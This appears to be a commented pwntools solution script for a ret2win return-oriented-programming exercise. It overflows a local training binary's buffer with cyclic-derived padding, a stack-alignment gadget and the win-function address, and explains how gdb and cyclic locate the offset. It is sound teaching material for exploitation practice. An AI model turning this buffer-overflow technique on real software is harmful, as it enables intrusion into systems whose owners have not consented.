from pwn import *

# the following command opens a new terminal in tmux with gdb attached to the process;
# this is useful in the first phase of debugging

# context.terminal = ["tmux", "splitw", "-h"]

# the following line tells to the pwntools library to print debug messages;
# in particular, sent / received messages will be printed

context.log_level = "debug"

# it is suggested to first analyse the binary with gdb, and only after to craft and
# directly send the payload

# p = gdb.debug('../target/rop1', '''b pwnme
# c
# ''')
p = process('../target/rop1')

# inside gdb, the command 'info functions' reveals a function named 'ret2win'
# then, the command 'p ret2win' reveals the address of the function

ret2win_addr = 0x400756

p.readuntil(b'> ')

# with the 'cyclic' tool and gdb, it is easy to find the length of the padding
# looking at the address where the binary crashes:

# p.sendline(cyclic(56))
# the address is the hexadecimal value for 'kaaalaaa'

padding_len = cyclic_find(b'kaaa')

payload  = b'A' * padding_len
payload += p64(0x00000000004006e7) # additional 'ret' to align the stack
payload += p64(ret2win_addr)

p.sendline(payload)
p.recvall()
